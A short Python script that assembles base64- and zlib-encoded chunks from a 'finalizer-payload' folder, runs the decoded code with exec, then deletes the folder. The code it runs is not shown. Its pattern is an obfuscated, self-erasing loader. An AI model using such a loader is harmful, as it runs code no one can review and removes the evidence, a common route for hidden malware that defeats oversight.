#!/usr/bin/env python3
from pathlib import Path
import base64
import shutil
import zlib

payload_directory = Path(__file__).with_name("finalizer-payload")
encoded = "".join(
    path.read_text(encoding="utf-8")
    for path in sorted(payload_directory.glob("*.txt"))
)
source = zlib.decompress(base64.b64decode(encoded))
exec(compile(source, __file__, "exec"), globals())
shutil.rmtree(payload_directory)
